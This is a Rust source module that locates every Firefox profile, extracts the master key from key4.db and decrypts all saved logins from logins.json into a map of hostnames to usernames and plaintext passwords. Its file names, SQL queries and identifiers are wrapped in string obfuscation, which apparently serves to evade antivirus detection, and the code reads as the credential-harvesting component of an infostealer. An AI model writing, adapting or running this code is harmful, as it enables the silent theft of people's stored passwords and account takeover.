use aes::Aes256;
use base64::DecodeError;
use block_modes::BlockMode;
use block_modes::{block_padding, Cbc, InvalidKeyIvLength};
use der_parser::{ber::BerObject, error::BerError};
use des::TdesEde3;
use ring::pbkdf2::PBKDF2_HMAC_SHA256;
use sha1::Sha1;
use sqlx::{prelude::*, SqliteConnection};
use std::fs::File;
use std::{collections::HashMap, io::Read, num::NonZeroU32, path::Path, string::FromUtf8Error};

type Aes256Cbc = Cbc<Aes256, block_padding::NoPadding>;
type TripleDesCbc = Cbc<TdesEde3, block_padding::NoPadding>;

static CKA_ID: &[u8; 16] = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01";

pub type Logins = HashMap<String, Vec<Login>>;
pub type FirefoxResult<T> = Result<T, FirefoxError>;
#[derive(Debug, serde::Serialize, serde::Deserialize)]
pub struct Login {
    username: String,
    password: String,
}

#[derive(serde::Serialize, serde::Deserialize, Debug)]
struct LoginFile {
    logins: Vec<EncryptedLogins>,
}

#[derive(serde::Serialize, serde::Deserialize, Debug)]
struct EncryptedLogins {
    hostname: String,
    #[serde(rename = "encryptedUsername")]
    encrypted_username: String,
    #[serde(rename = "encryptedPassword")]
    encrypted_password: String,
}

pub async fn get_all_logins() -> FirefoxResult<Logins> {
    let mut logins = Logins::new();
    if let Some(ff_profiles) = crate::utils::FIREFOX_PROFILES_PATH.as_ref() {
        for profile in ff_profiles.read_dir()? {
            if let Ok(profile) = profile {
                let mut key_db_path = profile.path().clone();
                key_db_path.push(obfstr::obfstr!("key4.db"));

                let mut logins_path = profile.path().clone();
                logins_path.push(obfstr::obfstr!("logins.json"));

                if let Ok(key) = get_key_from_db(&key_db_path).await {
                    let _ = get_logins(&logins_path, &key, &mut logins).await;
                }
            }
        }
    }

    Ok(logins)
}

async fn get_logins(login_path: &Path, key: &[u8], logins: &mut Logins) -> FirefoxResult<()> {
    let mut login_file_content = String::new();
    File::open(login_path)
        .unwrap()
        .read_to_string(&mut login_file_content)?;

    let login_file: LoginFile = serde_json::from_str(&login_file_content)?;

    for login in &login_file.logins {
        match decrypt_login(login, key) {
            Ok((username, password)) => {
                logins
                    .entry(login.hostname.clone())
                    .or_default()
                    .push(Login { username, password });
            }
            Err(_) => continue,
        }
    }

    Ok(())
}

#[inline(always)]
fn decrypt_login(login: &EncryptedLogins, key: &[u8]) -> FirefoxResult<(String, String)> {
    let encrypted_username_raw = base64::decode(&login.encrypted_username)?;
    let encrypted_password_raw = base64::decode(&login.encrypted_password)?;

    let (_, enc_user) = der_parser::ber::parse_ber(&encrypted_username_raw)?;
    let (_, enc_pass) = der_parser::ber::parse_ber(&encrypted_password_raw)?;

    let username = String::from_utf8(decrypt_3des(&enc_user, key)?)?;
    let password = String::from_utf8(decrypt_3des(&enc_pass, key)?)?;

    Ok((username, password))
}

fn decrypt_3des(decoded_item: &BerObject, key: &[u8]) -> FirefoxResult<Vec<u8>> {
    if decoded_item[1][0].as_oid()?.to_id_string() == obfstr::obfstr!("1.2.840.113549.3.7") {
        let iv = decoded_item[1][1].as_slice()?;
        let enc_data = decoded_item[2].as_slice()?;

        let cipher = TripleDesCbc::new_var(&key[0..24], iv)?;
        let mut raw_clear_data = cipher.decrypt_vec(enc_data).map_err(FirefoxError::mf)?;

        if let Some(&last) = raw_clear_data.last() {
            let last = usize::from(last);
            raw_clear_data.truncate(raw_clear_data.len().saturating_sub(last));
            Ok(raw_clear_data)
        } else {
            Err(FirefoxError::Malformed)
        }
    } else {
        Err(FirefoxError::Malformed)
    }
}

async fn get_key_from_db(db_path: &Path) -> FirefoxResult<Vec<u8>> {
    let mut conn = SqliteConnection::connect(&db_path.to_string_lossy()).await?;

    let row = sqlx::query(obfstr::obfstr!(
        "SELECT item1, item2 FROM metadata WHERE id = 'password';"
    ))
    .fetch_one(&mut conn)
    .await?;

    let global_salt: Vec<u8> = row.try_get(obfstr::obfstr!("item1"))?;

    let item2_der: Vec<u8> = row.try_get(obfstr::obfstr!("item2"))?;
    let check_password = get_clear_value(&item2_der, &global_salt)?;

    if check_password == obfstr::obfstr!("password-check\x02\x02").as_bytes() {
        let data_key_row = sqlx::query(obfstr::obfstr!("SELECT a11,a102 FROM nssPrivate;"))
            .fetch_one(&mut conn)
            .await?;

        let a11: Vec<u8> = data_key_row.try_get(obfstr::obfstr!("a11"))?;
        let a102: Vec<u8> = data_key_row.try_get(obfstr::obfstr!("a102"))?;

        if a102 == CKA_ID {
            get_clear_value(&a11, &global_salt)
        } else {
            Err(FirefoxError::Malformed)
        }
    } else {
        Err(FirefoxError::BadPassword)
    }
}

fn get_clear_value(raw_ber: &[u8], global_salt: &[u8]) -> FirefoxResult<Vec<u8>> {
    let (_, item2_decoded) = der_parser::der::parse_der(raw_ber)?;

    let algorithm = item2_decoded[0][0].as_oid().unwrap().to_id_string();

    if algorithm == obfstr::obfstr!("1.2.840.113549.1.5.13") {
        get_value_pbes2(&item2_decoded, &global_salt)
    } else {
        Err(FirefoxError::Malformed)
    }
}

fn get_value_pbes2(decoded_item: &BerObject, global_salt: &[u8]) -> FirefoxResult<Vec<u8>> {
    let entry_salt = decoded_item[0][1][0][1][0]
        .as_slice()
        .map_err(FirefoxError::mf)?;
    let iteration_count = decoded_item[0][1][0][1][1]
        .as_u32()
        .map_err(FirefoxError::mf)?;
    let key_length = decoded_item[0][1][0][1][2]
        .as_u32()
        .map_err(FirefoxError::mf)?;
    let cipher_txt = decoded_item[1].as_slice().map_err(FirefoxError::mf)?;
    let iv_body = decoded_item[0][1][1][1]
        .as_slice()
        .map_err(FirefoxError::mf)?;

    if key_length == 32 {
        let mut k_hasher = Sha1::new();
        k_hasher.update(global_salt);

        // we know the key is 32 bytes in advance
        let mut key = vec![0u8; 32];

        let k = k_hasher.digest().bytes();
        ring::pbkdf2::derive(
            PBKDF2_HMAC_SHA256,
            NonZeroU32::new(iteration_count).ok_or(FirefoxError::Malformed)?,
            entry_salt,
            &k,
            &mut key,
        );

        let iv_header = [0x04, 0x0e];
        let mut iv = Vec::with_capacity(iv_header.len() + iv_body.len());
        iv.extend_from_slice(&iv_header);
        iv.extend_from_slice(iv_body);

        let key_cipher = Aes256Cbc::new_var(&key, &iv).unwrap();
        let value = key_cipher.decrypt_vec(&cipher_txt).unwrap();

        Ok(value)
    } else {
        Err(FirefoxError::Malformed)
    }
}

#[derive(Debug)]
pub enum FirefoxError {
    BadPassword,
    Error1(sqlx::Error),
    Error2(der_parser::nom::Err<BerError>),
    Error3(BerError),
    Malformed,
    Utf8(FromUtf8Error),
    Io,
}
impl FirefoxError {
    fn mf<T>(_: T) -> Self {
        FirefoxError::Malformed
    }
}
impl From<sqlx::Error> for FirefoxError {
    fn from(e: sqlx::Error) -> Self {
        FirefoxError::Error1(e)
    }
}
impl From<BerError> for FirefoxError {
    fn from(e: BerError) -> Self {
        FirefoxError::Error3(e)
    }
}
impl From<der_parser::nom::Err<BerError>> for FirefoxError {
    fn from(e: der_parser::nom::Err<BerError>) -> Self {
        FirefoxError::Error2(e)
    }
}
impl From<FromUtf8Error> for FirefoxError {
    fn from(e: FromUtf8Error) -> Self {
        FirefoxError::Utf8(e)
    }
}
impl From<InvalidKeyIvLength> for FirefoxError {
    fn from(_: InvalidKeyIvLength) -> Self {
        FirefoxError::Malformed
    }
}
impl From<DecodeError> for FirefoxError {
    fn from(_: DecodeError) -> Self {
        FirefoxError::Malformed
    }
}
impl From<serde_json::Error> for FirefoxError {
    fn from(_: serde_json::Error) -> Self {
        FirefoxError::Malformed
    }
}
impl From<std::io::Error> for FirefoxError {
    fn from(_: std::io::Error) -> Self {
        FirefoxError::Io
    }
}
